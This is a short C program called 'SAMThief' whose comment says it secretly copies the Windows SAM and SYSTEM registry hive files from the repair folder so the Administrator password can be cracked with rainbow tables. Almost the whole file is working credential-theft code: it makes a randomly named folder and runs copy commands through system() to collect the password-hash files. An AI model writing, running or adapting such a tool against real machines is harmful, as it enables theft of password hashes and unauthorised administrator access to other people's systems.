#include <stdio.h>
//SAMThief - Harvie (2oo7)
/*
Quicky & secretly copies sam & system files from %systemroot%\repair
This files should be used to crack, Administrator password.
For example by using ophcrack.sourceforge.net (Rainbow tables crack)
*/

int main(int argc, char *argv[])
{
  srand(time(NULL));
  unsigned char i = rand();
  #define SIZE 64
  char dir[SIZE], now[SIZE];
  
  sprintf(dir, "%%username%%\\%d\\", i);
  printf("%s\n", dir);
  
  //system("@echo off");
  sprintf(now, "mkdir %s", dir);
  system(now);  
  sprintf(now, "copy %%SystemRoot%%\\repair\\sam %s", dir);
  system(now);
  sprintf(now, "copy %%SystemRoot%%\\repair\\system %s", dir);
  system(now);
  //system("PAUSE");	
  //return 0;
}
